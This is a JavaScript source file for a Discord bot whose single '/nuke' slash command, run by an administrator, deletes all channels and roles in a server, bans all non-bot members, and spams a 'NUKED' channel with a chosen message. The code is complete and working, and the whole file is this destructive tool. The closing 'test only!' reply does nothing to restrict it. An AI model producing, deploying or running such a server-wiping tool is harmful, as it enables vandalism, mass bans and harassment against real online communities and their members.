const { Client, GatewayIntentBits, SlashCommandBuilder, Routes, REST, EmbedBuilder } = require("discord.js");

const TOKEN = process.env.DISCORD_TOKEN || "YOUR_BOT_TOKEN";
const CLIENT_ID = process.env.CLIENT_ID || "YOUR_CLIENT_ID";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

const rest = new REST({ version: "10" }).setToken(TOKEN);

// Slash commands
const commands = [
  new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("888 Nuked You LOL")
    .addStringOption(opt =>
      opt.setName("spam_message")
        .setDescription("Message to spam in channels")
        .setRequired(true)
    )
];

(async () => {
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("✅ Nuke slash command registered!");
  } catch (err) {
    console.error(err);
  }
})();

client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
});

// Nuke command
client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "nuke") return;

  if (!interaction.member.permissions.has("Administrator")) {
    return interaction.reply({ content: "❌ You must be an Administrator to use this command.", ephemeral: true });
  }

  await interaction.deferReply({ ephemeral: true });

  const spamMessage = interaction.options.getString("spam_message");
  const guild = interaction.guild;

  // 1️⃣ Delete all channels
  for (const channel of guild.channels.cache.values()) {
    try {
      await channel.delete();
    } catch (err) {
      console.log(`Could not delete channel ${channel.name}: ${err}`);
    }
  }

  // 2️⃣ Delete all roles
  for (const role of guild.roles.cache.values()) {
    try {
      if (!role.managed && role.id !== guild.id) {
        await role.delete();
      }
    } catch (err) {
      console.log(`Could not delete role ${role.name}: ${err}`);
    }
  }

  // 3️⃣ Ban all members except bot
  for (const member of guild.members.cache.values()) {
    try {
      if (!member.user.bot) {
        await member.ban({ reason: "Server nuked" });
      }
    } catch (err) {
      console.log(`Could not ban member ${member.user.tag}: ${err}`);
    }
  }

  // 4️⃣ Spam new channels
  const newChannel = await guild.channels.create({ name: "NUKED", type: 0 }); // 0 = text
  for (let i = 0; i < 10; i++) {
    await newChannel.send(spamMessage);
  }

  await interaction.editReply({ content: "✅ Server nuked (test only!)." });
});

client.login(TOKEN);
